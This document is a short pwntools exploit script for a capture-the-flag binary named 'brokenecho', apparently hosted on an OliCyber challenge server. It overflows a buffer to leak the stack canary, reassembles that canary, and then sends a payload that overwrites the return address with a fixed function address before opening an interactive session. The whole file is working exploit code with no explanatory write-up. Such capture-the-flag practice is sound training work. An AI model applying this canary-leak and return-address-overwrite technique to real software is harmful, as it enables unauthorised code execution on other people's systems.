from pwn import *

elf = ELF('./brokenecho')
context.binary = elf
context.terminal = ()
if args.REMOTE:
    p = remote('brokenecho.challs.olicyber.it', 38065)
elif args.GDB:
    p = gdb.debug([elf.path],'''
                  b main
                  c
                  '''
                  )
else:
    p = process([elf.path])


p.sendlineafter(b'> ', b'1')  
p.sendlineafter(b': ',b'a'*72)
                            
p.recvuntil(b'a\n')
canary = p.recvline().strip()
canary = list(canary.hex())
canary = canary[0:14:1]
real_canary = ''
for c in canary:
    real_canary +=c
real_canary = bytes.fromhex(real_canary) +b'\x00'
payload = b'a'*72 + b'\x00' + real_canary  + b'a'*7 + p64(0x401320)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', payload)
p.sendlineafter(b'> ',b'2')
p.interactive()
